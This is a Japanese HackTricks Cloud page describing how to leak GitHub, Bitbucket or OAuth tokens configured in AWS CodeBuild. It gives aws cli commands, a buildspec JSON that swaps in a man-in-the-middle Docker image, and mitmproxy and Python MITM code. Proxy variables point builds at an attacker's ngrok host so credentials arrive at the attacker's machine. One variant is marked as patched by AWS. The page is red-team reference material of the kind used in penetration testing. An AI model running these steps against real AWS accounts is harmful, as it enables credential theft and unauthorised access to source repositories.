# AWS Codebuild - トークンリーク

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## Github/Bitbucketで設定されたトークンの回復

まず、リークする可能性のある設定済みのソースクレデンシャルがあるかどうかを確認します：
```bash
aws codebuild list-source-credentials
```
### Dockerイメージ経由

たとえばGithubへの認証がアカウントで設定されていることがわかった場合、特定のDockerイメージを使用してプロジェクトのビルドを実行するようにCodebuildを設定することで、そのアクセス（**GHトークンまたはOAuthトークン**）を**抜き取る**ことができます。

この目的のために、新しいCodebuildプロジェクトを**作成する**か、既存のプロジェクトの**環境**を変更して**Dockerイメージ**を設定することができます。

使用できるDockerイメージは[https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)です。これは非常に基本的なDockerイメージで、**環境変数`https_proxy`**、**`http_proxy`**、および**`SSL_CERT_FILE`**を設定します。これにより、**`https_proxy`**と**`http_proxy`**で指定されたホストのほとんどのトラフィックを傍受し、**`SSL_CERT_FILE`**で指定されたSSL証明書を信頼することができます。

1. **自分のDocker MitMイメージを作成してアップロードする**
* リポジトリの指示に従ってプロキシIPアドレスを設定し、SSL証明書を設定して**dockerイメージをビルド**します。
* メタデータエンドポイントへのリクエストを傍受しないように、**`http_proxy`を設定しないでください**。
* プロキシをホストに設定するために**`ngrok`**を使用できます（例：`ngrok tcp 4444`）。
* Dockerイメージをビルドしたら、**パブリックリポジトリにアップロード**します（Dockerhub、ECRなど）。
2. **環境を設定する**

* 新しいCodebuildプロジェクトを**作成する**か、既存のプロジェクトの環境を**変更**します。
* プロジェクトが**以前に生成されたDockerイメージ**を使用するように設定します。
*

```
<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
```
3. **ホストでMitMプロキシを設定する**
* **Githubリポジトリ**で示されているように、次のようなものを使用できます：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
4. **ビルドを実行し、クレデンシャルをキャプチャする**

*   **Authorization** ヘッダーでトークンを確認できます：

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

これは aws cli を使用して以下のように行うこともできます

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTPプロトコル経由~~

{% hint style="success" %}
**この脆弱性はAWSによって2023年2月20日の週のいつか（金曜日だと思います）に修正されました。そのため、攻撃者はこれを悪用できなくなりました :)**
{% endhint %}

攻撃者は、**CodeBuild内で昇格した権限を持っている場合、設定されたGithub/Bitbucketトークンを漏洩させる**ことができます。また、OAuthを介して権限が設定されている場合は、**コードにアクセスするために使用される一時的なOAuthトークンを漏洩させる**ことができます。

* 攻撃者は、環境変数**http\_proxy**と**https\_proxy**をCodeBuildプロジェクトに追加し、自分のマシンを指すように設定することができます（例：`http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 次に、githubリポジトリのURLをHTTPSではなくHTTPを使用するように変更します。例えば：**http://**github.com/carlospolop-forks/TestActions
* その後、プロキシ変数（http\_proxyとhttps\_proxy）によって指されたポートで[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)からの基本的な例を実行します。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最後に、**プロジェクトのビルド**をクリックすると、**認証情報**がクリアテキスト（base64）でmitmポートに**送信されます**：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
これで攻撃者は、自分のマシンからトークンを使用し、その権限をすべてリストし、CodeBuildサービスを直接使用するよりも簡単に（悪用）利用できるようになります。
{% endhint %}

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

* HackTricksに**会社を広告掲載**したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
